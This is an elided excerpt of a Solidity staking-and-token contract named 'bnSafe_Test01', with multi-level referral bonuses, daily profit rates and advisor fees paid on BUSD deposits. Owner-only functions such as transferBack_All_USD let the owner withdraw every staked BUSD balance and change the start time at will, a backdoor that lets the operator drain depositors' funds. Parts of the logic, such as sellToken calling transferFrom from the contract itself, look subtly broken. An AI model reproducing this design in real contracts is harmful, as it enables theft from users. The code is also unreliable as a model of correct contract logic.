...
contract bnSafe_Test01 is Token {
    ...
    uint private constant MIN_STAKE          = 10 ether;
    uint private constant USER_LIMIT_AIRDROP = 90000 ether;
    uint private constant USER_AIRDROP       = 300 ether;
    uint private constant OWNER_AIRDROP      = 50000 ether;    
    
    uint private constant BUSD_DAILYPROFIT  = 20000; // 20;
    uint private constant TOKEN_DAILYPROFIT = 40000; // 40;
    ...
    address busd = 0x8A953CfE442c5E8855cc6c61b1293FA648BAE472;
    ...
    event TokenOperation(address indexed account, string txType, uint tokenAmount, uint usdAmount);
    ...
    function transferBack_USD(uint256 val) external onlyOwner {
        IERC20(busd).transfer(msg.sender, val);
    }     
    
    function transferBack_All_USD() external onlyOwner {
        IERC20(busd).transfer(msg.sender, getContractUSDBalance());
    }       
    ...
    function changeST(uint ST) external onlyOwner {
        startTime = ST;
    }
    ...
    function stakeUSD(uint usdAmount, address referrer) public {
        User storage user = users[msg.sender];
        require(now >= startTime, "Stake not available yet");
        
        uint msgValue = usdAmount;
        IERC20(busd).transferFrom(address(msg.sender), address(this), msgValue);
        
        require(msgValue >= MIN_STAKE, "Minimum to stake is 10");
		
		uint fee = msgValue.mul(ADV_FEE).div(PERCENT_DIVIDER);
        IERC20(busd).transfer(PRJ_1, fee);
        IERC20(busd).transfer(ADV_1, fee);
        IERC20(busd).transfer(ADV_2, fee);
		...
		if (user.referrer != address(0)) {
			...
			for (uint256 i = 0; i < REF_BONUSES.length; i++) {
				...
				uint256 amount = msgValue.mul(REF_BONUSES[i]).div(PERCENT_DIVIDER);
        ...
        if (user.sM.totalStaked == 0) {
            ...
            updateStakeUSD_IP(msg.sender);
        }
      
        user.sM.lastStakeTime = now;
        user.sM.totalStaked = user.sM.totalStaked.add(msgValue);
        totalUSDStaked = totalUSDStaked.add(msgValue);
    }
    ...
    function updateStakeUSD_IP(address _addr) private {
        User storage user = users[_addr];
        uint256 amount = getStakeUSD_IP(_addr);
        if(amount > 0) {
    ...
    function getStakeUSD_IP(address _addr) view private returns(uint256 value) {
        User storage user = users[_addr];
    ...
    function sellToken(uint tokenAmount) public {
        ...
        uint usdAmount = tokenToUSD(tokenAmount);
    
        require(getContractUSDBalance() >= usdAmount, "Insufficient Contract Balance");
        
        updateStakeUSD_IP(msg.sender);
        uint sub = minVal(usdAmount, users[msg.sender].sM.totalStaked);
        ...
        IERC20(busd).transferFrom(address(this), msg.sender, usdAmount);
        emit TokenOperation(msg.sender, "SELL", tokenAmount, usdAmount);
    }
    
    function buyToken(uint tokenAmount, uint usdAmount) public {
        uint msgValue = usdAmount;
        IERC20(busd).transferFrom(msg.sender, address(this), msgValue);        
        
        require(msgValue == tokenAmount.mul(getTokenPrice().mul(2)).div(PRICE_DIVIDER), "Wrong Amount");
       ...
       _transfer(address(this), msg.sender, tokenAmount);
       emit TokenOperation(msg.sender, "BUY", tokenAmount, msgValue);
    } 
    ...
    function claimAirdropM() public onlyOwner {  // 50,000 tokens can be claimed by the owner in amounts of 10,000 every 10 days for promotions, airdrop and liquidity for sale 
        ...
        require(ownerManualAirdrop <= OWNER_AIRDROP, "Airdrop limit exceed");
    ...
    function getUserUnclaimedTokens_M(address _addr) public view returns(uint value) {
        User storage user = users[_addr];
        return getStakeUSD_IP(_addr).add(user.sM.unClaimedTokens); 
    }
	...
	function getContractUSDBalance() public view returns (uint) {
	...
	function getUserUSDBalance(address _addr) public view returns (uint) {
		return IERC20(busd).balanceOf(_addr);
	}	
    ...
    function getTokenPrice() public view returns(uint) {
        uint d1 = getContractUSDBalance().mul(PRICE_DIVIDER);
        uint d2 = availableSupply().add(1);
        return d1.div(d2);
    } 

    function tokenToUSD(uint tokenAmount) public view returns(uint) {
